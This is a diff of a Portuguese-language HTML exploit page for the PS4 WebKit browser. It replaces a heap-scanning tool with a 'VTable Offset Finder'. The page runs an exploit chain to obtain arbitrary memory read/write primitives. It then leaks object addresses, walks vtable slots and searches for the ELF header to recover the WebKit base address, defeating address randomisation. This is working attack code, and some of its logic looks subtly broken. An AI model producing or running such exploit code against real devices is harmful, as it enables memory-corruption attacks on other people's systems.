@@ -1,240 +1,289 @@
+
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>PS4 WebKit — Heap Scan</title>
+<title>PS4 WebKit — VTable Offset Finder</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  html, body {
-    height: 100%;
-    background: #0b0f19;
-    color: #c8ced8;
-    font: 14px/1.5 "Segoe UI", system-ui, sans-serif;
-    display: flex; flex-direction: column;
-    align-items: center;
-    justify-content: flex-start;
-    gap: 14px;
-    padding: 20px;
-  }
-  h1 { color: #fff; font-size: 22px; letter-spacing: 0.5px; }
-  #status {
-    font-size: 20px; font-weight: 700; color: #fff;
-    min-height: 1.5em;
-    text-align: center;
-  }
-  #log {
-    width: 95%; max-width: 900px; height: 520px;
-    background: #111827; border: 1px solid #1f2937;
-    border-radius: 10px; padding: 14px 16px;
-    overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
-    font-size: 12px; color: #9fb1c3;
-    white-space: pre-wrap; word-break: break-all;
-    box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
-  }
-  #log .ok { color: #4ade80; }
-  #log .err { color: #f87171; }
-  #log .info { color: #60a5fa; }
-  #log .warn { color: #fbbf24; }
-  #actions {
-    display: flex; gap: 12px; flex-wrap: wrap;
-    justify-content: center;
-  }
-  button {
-    padding: 12px 28px; border: 1px solid rgba(255,255,255,0.18);
-    border-radius: 12px; color: #fff;
-    background: linear-gradient(135deg, #3b82f6, #1d4ed8);
-    box-shadow: 0 8px 24px rgba(37,99,235,0.28);
-    font: 700 15px/1 "Segoe UI", system-ui, sans-serif;
-    cursor: pointer; transition: all .12s ease;
-  }
-  button:hover { transform: translateY(-2px); }
-  button:active { transform: translateY(1px); }
-  button:disabled {
-    opacity: 0.45; cursor: not-allowed; transform: none;
-    background: #374151; box-shadow: none;
-  }
+  html, body { height: 100%; background: #0b0f19; color: #c8ced8;
+    font: 13px/1.5 "Segoe UI", system-ui, sans-serif;
+    display: flex; flex-direction: column; align-items: center;
+    gap: 10px; padding: 14px; }
+  h1 { color: #fff; font-size: 16px; text-align: center; }
+  #status { font-size: 14px; font-weight: 700; color: #fff; text-align: center; }
+  .panel { background: #111827; border: 1px solid #1f2937; border-radius: 8px;
+    padding: 12px; width: 95%; max-width: 720px; }
+  .row { display: flex; justify-content: space-between; padding: 3px 0;
+    font-family: monospace; font-size: 12px; border-bottom: 1px solid #1f2937; }
+  .row:last-child { border-bottom: none; }
+  .label { color: #9ca3af; } .value { color: #60a5fa; font-weight: bold; }
+  .value.good { color: #4ade80; } .value.bad { color: #f87171; }
+  #log { width: 95%; max-width: 720px; height: 140px; background: #111827;
+    border: 1px solid #1f2937; border-radius: 8px; padding: 8px;
+    overflow-y: auto; font-family: monospace; font-size: 11px; color: #9fb1c3; }
+  #log .ok { color: #4ade80; } #log .err { color: #f87171; }
+  #log .found { color: #a78bfa; font-weight: bold; }
+  .ctrl-btn { padding: 10px 16px; border-radius: 6px; border: none;
+    background: #1e40af; color: #fff; cursor: pointer; font-size: 12px; font-weight: 600; }
+  .ctrl-btn:hover { background: #2563eb; }
+  .ctrl-btn:disabled { background: #374151; opacity: 0.4; cursor: not-allowed; }
+  .ctrl-btn.success { background: #15803d; }
+  .guess-btn { padding: 6px 8px; border-radius: 4px; border: 1px solid #374151;
+    background: #1f2937; color: #fff; cursor: pointer; font-size: 10px;
+    font-family: monospace; }
+  .guess-btn:hover { border-color: #60a5fa; }
+  .guess-btn.found { background: #15803d; border-color: #22c55e; }
+  .section { color: #9ca3af; font-size: 10px; text-transform: uppercase; margin: 4px 0 2px; }
+  .hint { color: #6b7280; font-size: 11px; text-align: center; max-width: 720px; }
 </style>
 </head>
 <body>
-
-<h1>PS4 WebKit — Heap Scan (Safe)</h1>
+<h1>PS4 WebKit — VTable Offset Finder</h1>
 <div id="status">Inicializando...</div>
-<div id="log"></div>
-<div id="actions">
-  <button id="btnHeapScan" disabled>Heap Scan</button>
-  <button id="btnInfo" disabled>Info Básica</button>
-  <button id="btnClear" onclick="clearLog()">Limpar Log</button>
+
+<div class="section">Valores do Exploit</div>
+<div class="panel" id="leaks">
+  <div class="row"><span class="label">__ps5NativeCtor:</span><span class="value" id="l-ctor">---</span></div>
+  <div class="row"><span class="label">textarea obj (leakval):</span><span class="value" id="l-obj">---</span></div>
+  <div class="row"><span class="label">carrier.textareaAddress:</span><span class="value" id="l-cta">---</span></div>
 </div>
+
+<div class="hint">
+  O PS4 13.50 pode ter o vtable em um <b>offset diferente</b> do PS5.<br>
+  Vamos escanear todos os offsets do objeto textarea (0x00 a 0x80) para encontrar o vtable.
+</div>
+
+<div class="section">Acoes</div>
+<div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center;">
+  <button class="ctrl-btn success" onclick="scanOffsets()">🔎 Escanear Offsets 0x00-0x80</button>
+  <button class="ctrl-btn" onclick="scanVtableSlots()">🔎 Escanear Slots do VTable</button>
+  <button class="ctrl-btn" onclick="testBaseFromCtor()">🔎 Testar Base via Ctor</button>
+  <button class="ctrl-btn" onclick="clearLog()">🗑️ Limpar</button>
+</div>
+
+<div class="section">Offsets Encontrados (clique para ler vtable[0])</div>
+<div style="display:flex;gap:4px;flex-wrap:wrap;justify-content:center;max-width:720px;" id="offsets"></div>
+
+<div id="log"></div>
 
 <script type="module">
   import { establishPrimitive } from "./resources/core.js";
   import { installWindowP } from "./resources/mem.js";
   import { int64 } from "./resources/int64.js";
 
-  const status = document.getElementById("status");
   const logBox = document.getElementById("log");
-  const btnHeapScan = document.getElementById("btnHeapScan");
-  const btnInfo = document.getElementById("btnInfo");
-
-  function log(msg, cls = "info") {
+  const status = document.getElementById("status");
+  function log(msg, cls) {
     const line = document.createElement("div");
-    line.className = cls;
-    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    line.className = cls || "info";
+    line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
     logBox.appendChild(line);
     logBox.scrollTop = logBox.scrollHeight;
+    while (logBox.children.length > 30) logBox.removeChild(logBox.firstChild);
   }
+  window.clearLog = function() { logBox.innerHTML = ""; log("Log limpo."); };
 
-  window.clearLog = function() {
-    logBox.innerHTML = "";
-  };
+  let carrierRef = null;
+  let primRef = null;
 
-  function onCoreEvent(tag, detail) {
-    log(`${tag}: ${detail}`, "info");
-  }
-
-  function onMemEvent(tag, detail) {
-    log(`${tag}: ${detail}`, "info");
-  }
-
-  // ========== INFO BÁSICA (sem scan) ==========
-  window.showInfo = function() {
+  // ============================================================
+  // ESCANEAR OFFSETS DO OBJETO TEXTAREA
+  // ============================================================
+  window.scanOffsets = async function() {
     const p = window.p;
-    if (!p) { log("window.p não disponível", "err"); return; }
+    if (!p) { log("window.p nao disponivel!", "err"); return; }
 
-    log("=== INFO BÁSICA ===", "ok");
-    log(`User-Agent: ${navigator.userAgent}`, "info");
+    log("=== Escaneando offsets do textarea ===", "warn");
+    const textArea = document.createElement("textarea");
+    const objAddr = p.leakval(textArea);
+    document.getElementById("l-obj").textContent = "0x" + objAddr.toString(16);
+    log("textarea obj @ 0x" + objAddr.toString(16), "ok");
 
-    let ctor = globalThis.__ps5NativeCtor;
-    if (ctor) {
-      log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
-    }
+    const offsetsDiv = document.getElementById("offsets");
+    offsetsDiv.innerHTML = "";
 
-    let textarea = document.createElement("textarea");
-    let textAddr = p.leakval(textarea);
-    let vtablePtr = p.read8(textAddr.add32(0x18));
-    log(`textarea @ 0x${textAddr.toString(16)}`, "info");
-    log(`vtable ptr @ 0x${vtablePtr.toString(16)}`, "info");
-
-    // Vtable [0] e [1] apenas (seguro)
-    let e0 = p.read8(vtablePtr);
-    let e1 = p.read8(vtablePtr.add32(8));
-    log(`vtable[0] = 0x${e0.toString(16)}`, "info");
-    log(`vtable[1] = 0x${e1.toString(16)}`, "info");
-
-    // Heap range guess
-    log(`Heap range (guess): 0x200000000 - 0x210000000`, "info");
-  };
-
-  // ========== HEAP SCAN (100% seguro - só lê heap mapeado) ==========
-  window.heapScan = function() {
-    const p = window.p;
-    if (!p) { log("window.p não disponível", "err"); return; }
-
-    log("=== HEAP SCAN (amostral) ===", "ok");
-    log("Procurando ponteiros para 0x80xxxxxxx no heap...", "info");
-
-    // Heap no PS4 começa em ~0x200000000
-    // Vamos fazer scan amostral: a cada 0x1000 bytes, ler 8 bytes
-    const HEAP_START = new int64(0, 0x20); // 0x200000000
-    const HEAP_END = new int64(0, 0x21);   // 0x210000000 (16MB de heap)
-    const STEP = 0x1000; // 4KB
-    const SAMPLES = 4096; // 4096 * 4KB = 16MB
-
-    let found = [];
-    let lowest = null;
-
-    for (let i = 0; i < SAMPLES; i++) {
-      let addr = HEAP_START.add32(i * STEP);
+    // Escanear offsets 0x00 a 0x80 em passos de 8
+    for (let off = 0; off <= 0x80; off += 8) {
       try {
-        let val = p.read8(addr);
-        // Procurar ponteiros na faixa 0x800000000 - 0x900000000
-        if (val.hi === 0x8 || (val.hi >= 0x80 && val.hi <= 0x8f)) {
-          // Pode ser um ponteiro de código
-          if (!lowest || (val.hi < lowest.hi) || (val.hi === lowest.hi && val.low < lowest.low)) {
-            lowest = val;
-          }
-          if (found.length < 20) { // só logar os primeiros 20
-            log(`  Heap+0x${(i * STEP).toString(16)} -> 0x${val.toString(16)}`, "info");
-            found.push(val);
-          }
+        const ptr = p.read8(objAddr.add32(off));
+        const ptrNum = ptr.hi * 0x100000000 + ptr.low;
+        const ptrHex = "0x" + ptr.toString(16);
+
+        // Verificar se parece um ponteiro valido (faixa 0x800000000+)
+        const isHigh = ptrNum >= 0x800000000 && ptrNum < 0x900000000;
+        const isMaybeVtable = isHigh && (ptrNum & 0xFFF) === 0; // alinhado a pagina
+
+        if (isHigh) {
+          log("offset 0x" + off.toString(16).padStart(2,"0") + " => " + ptrHex + (isMaybeVtable ? " [POSSIVEL VTABLE]" : ""), isMaybeVtable ? "found" : "info");
+
+          const btn = document.createElement("button");
+          btn.className = "guess-btn" + (isMaybeVtable ? " found" : "");
+          btn.textContent = "0x" + off.toString(16) + " => " + ptrHex.slice(0,6) + "..." + ptrHex.slice(-6);
+          btn.onclick = () => readVtableAtOffset(off, ptr);
+          offsetsDiv.appendChild(btn);
         }
       } catch (e) {
-        // Heap pode ter buracos, mas geralmente não
-        if (i % 512 === 0) log(`  unreadable at +0x${(i * STEP).toString(16)}`, "warn");
-      }
-
-      if (i % 1024 === 0 && i > 0) {
-        log(`  Progresso: ${i/1024}MB scanned...`, "info");
+        // ignore
       }
     }
+    log("Escaneamento completo.", "ok");
+  };
 
-    if (lowest) {
-      log(`Menor ponteiro encontrado: 0x${lowest.toString(16)}`, "ok");
-      log(`Isso pode estar próximo da base do WebKit`, "warn");
+  // ============================================================
+  // LER VTABLE A PARTIR DE UM OFFSET ENCONTRADO
+  // ============================================================
+  window.readVtableAtOffset = async function(objOff, vtPtr) {
+    const p = window.p;
+    if (!p) return;
+    log("=== Lendo vtable @ offset 0x" + objOff.toString(16) + " ===", "warn");
 
-      // Tentar verificar se é ELF alinhando para baixo
-      let aligned = new int64(lowest.low & 0xFFFFC000, lowest.hi);
-      log(`Tentando ler ELF magic @ 0x${aligned.toString(16)}...`, "info");
-      try {
-        let magic = p.read4(aligned);
-        if (magic === 0x464c457f) {
-          log(`ELF MAGIC ENCONTRADO @ 0x${aligned.toString(16)}!!!`, "ok");
+    try {
+      // vtPtr aponta para a tabela vtable
+      // Ler os primeiros 8 slots (64 bytes)
+      for (let i = 0; i < 8; i++) {
+        const slot = p.read8(vtPtr.add32(i * 8));
+        const slotNum = slot.hi * 0x100000000 + slot.low;
+        const slotHex = "0x" + slot.toString(16);
+
+        if (slotNum >= 0x800000000 && slotNum < 0x900000000) {
+          log("  vtable[" + i + "] = " + slotHex + " [VALIDO]", "ok");
+
+          // Tentar calcular base com offset PS5
+          const base = slot.sub32(0x285170);
+          const baseNum = base.hi * 0x100000000 + base.low;
+          if (baseNum >= 0x800000000 && baseNum < 0x900000000) {
+            try {
+              const magic = p.read4(base);
+              const magicHex = "0x" + magic.toString(16).padStart(8, "0");
+              if (magicHex === "0x464c457f") {
+                log("  ✅ BASE ENCONTRADA! base=" + "0x" + base.toString(16) + " offset=" + objOff.toString(16), "found");
+                window.__webkitBase = base;
+                status.textContent = "BASE: 0x" + base.toString(16);
+                status.style.color = "#4ade80";
+                return;
+              }
+            } catch (e) {}
+          }
         } else {
-          log(`Magic: 0x${magic.toString(16).padStart(8,'0')} (não é ELF)`, "warn");
+          log("  vtable[" + i + "] = " + slotHex, "info");
         }
-      } catch (e) {
-        log(`Não conseguiu ler @ 0x${aligned.toString(16)}`, "err");
       }
-    } else {
-      log("Nenhum ponteiro para 0x80xxxxxxx encontrado no heap", "warn");
-    }
-
-    log("=== HEAP SCAN DONE ===", "ok");
+    } catch (e) { log("Erro: " + e.message, "err"); }
   };
 
-  btnHeapScan.onclick = window.heapScan;
-  btnInfo.onclick = window.showInfo;
+  // ============================================================
+  // ESCANEAR SLOTS DO VTABLE (se ja souber o ptr)
+  // ============================================================
+  window.scanVtableSlots = async function() {
+    const p = window.p;
+    if (!p) { log("window.p nao disponivel!", "err"); return; }
 
-  // ========== BOOTSTRAP ==========
-  log("Carregando módulos...", "ok");
-  status.textContent = "Executando exploit...";
+    const textArea = document.createElement("textarea");
+    const objAddr = p.leakval(textArea);
+    log("=== Escaneando slots do vtable ===", "warn");
 
-  establishPrimitive({ onEvent: onCoreEvent })
-    .then(carrier => {
-      log("Core: primitivo estabelecido", "ok");
-      log(`Tentativas: ${carrier.attempts}`, "info");
-
-      const prim = installWindowP(carrier, {
-        onEvent: onMemEvent,
-        promote: true
-      });
-
-      log("Mem: real pair ativo", "ok");
-      log("window.p está disponível", "ok");
-
-      window.__carrier = carrier;
-      window.__prim = prim;
-      window.int64 = int64;
-
-      status.textContent = "RW Primitivo OK";
-      status.style.color = "#4ade80";
-      btnHeapScan.disabled = false;
-      btnInfo.disabled = false;
-
+    // Tentar offset 0x18 primeiro (PS5)
+    for (const objOff of [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30]) {
       try {
-        const testAddr = prim.leakval(prim);
-        log(`Sanity leak(prim) = 0x${testAddr.toString(16)}`, "ok");
-      } catch (e) {
-        log(`Sanity leak falhou: ${e.message}`, "err");
-      }
-    })
-    .catch(err => {
-      log(`FALHA: ${err.name}: ${e.message}`, "err");
-      status.textContent = "Falha no exploit";
-      status.style.color = "#f87171";
-    });
-</script>
+        const vtPtr = p.read8(objAddr.add32(objOff));
+        const vtPtrNum = vtPtr.hi * 0x100000000 + vtPtr.low;
+        if (vtPtrNum < 0x800000000 || vtPtrNum >= 0x900000000) continue;
 
+        log("offset 0x" + objOff.toString(16) + " => vtable ptr " + "0x" + vtPtr.toString(16), "ok");
+
+        // Ler 16 slots do vtable
+        for (let i = 0; i < 16; i++) {
+          try {
+            const slot = p.read8(vtPtr.add32(i * 8));
+            const slotNum = slot.hi * 0x100000000 + slot.low;
+            if (slotNum >= 0x800000000 && slotNum < 0x900000000) {
+              log("  [" + i + "] " + "0x" + slot.toString(16), "ok");
+
+              // Testar como base candidata
+              const base = slot.sub32(0x285170);
+              try {
+                const magic = p.read4(base);
+                if (magic === 0x464c457f) {
+                  log("  ✅ BASE ENCONTRADA! " + "0x" + base.toString(16), "found");
+                  window.__webkitBase = base;
+                  status.textContent = "BASE: 0x" + base.toString(16);
+                  status.style.color = "#4ade80";
+                  return;
+                }
+              } catch (e) {}
+            }
+          } catch (e) { break; }
+        }
+      } catch (e) {}
+    }
+    log("Nenhuma base encontrada nos slots.", "err");
+  };
+
+  // ============================================================
+  // TESTAR BASE A PARTIR DO CTOR (offsets grandes)
+  // ============================================================
+  window.testBaseFromCtor = async function() {
+    const p = window.p;
+    const ctor = globalThis.__ps5NativeCtor;
+    if (!p || typeof ctor !== "number") { log("Ctor nao disponivel", "err"); return; }
+
+    log("=== Testando base a partir do ctor ===", "warn");
+    log("__ps5NativeCtor = 0x" + ctor.toString(16), "info");
+
+    // Testar offsets de 1MB a 1GB
+    const testOffsets = [
+      0x100000, 0x200000, 0x400000, 0x800000,
+      0x1000000, 0x2000000, 0x4000000, 0x8000000,
+      0x10000000, 0x20000000, 0x40000000, 0x80000000,
+    ];
+
+    for (const off of testOffsets) {
+      const base = (ctor - off) & ~0x3FFF;
+      if (base < 0x800000000 || base >= 0x900000000) continue;
+      const addr = new int64(base & 0xFFFFFFFF, Math.floor(base / 0x100000000));
+
+      log("off 0x" + off.toString(16) + " => base 0x" + addr.toString(16), "info");
+      try {
+        const magic = p.read4(addr);
+        const magicHex = "0x" + magic.toString(16).padStart(8, "0");
+        if (magicHex === "0x464c457f") {
+          log("✅ BASE ENCONTRADA!", "found");
+          window.__webkitBase = addr;
+          status.textContent = "BASE: 0x" + addr.toString(16);
+          status.style.color = "#4ade80";
+          return;
+        }
+      } catch (e) { log("  crash", "err"); }
+    }
+    log("Nenhuma base encontrada via ctor.", "err");
+  };
+
+  // BOOTSTRAP
+  log("Carregando...", "ok");
+  status.textContent = "Executando exploit...";
+  establishPrimitive({ onEvent: (tag, detail) => log(tag + ": " + detail, "info") })
+    .then(carrier => {
+      carrierRef = carrier;
+      const prim = installWindowP(carrier, { onEvent: (tag, detail) => log(tag + ": " + detail, "info"), promote: true });
+      primRef = prim;
+      window.__carrier = carrier; window.__prim = prim; window.p = prim; window.int64 = int64;
+      log("Exploit pronto!", "ok");
+
+      const ctor = globalThis.__ps5NativeCtor;
+      if (typeof ctor === "number") {
+        document.getElementById("l-ctor").textContent = "0x" + ctor.toString(16);
+        log("__ps5NativeCtor = 0x" + ctor.toString(16), "ok");
+      }
+      if (carrier.textareaAddress) {
+        document.getElementById("l-cta").textContent = "0x" + carrier.textareaAddress.toString(16);
+        log("carrier.textareaAddress = 0x" + carrier.textareaAddress.toString(16), "ok");
+      }
+
+      status.textContent = "Pronto — clique em 'Escanear Offsets'";
+      status.style.color = "#60a5fa";
+    })
+    .catch(err => { log("FALHA: " + err.name + ": " + err.message, "err"); status.textContent = "Falha"; status.style.color = "#f87171"; });
+</script>
 </body>
 </html>
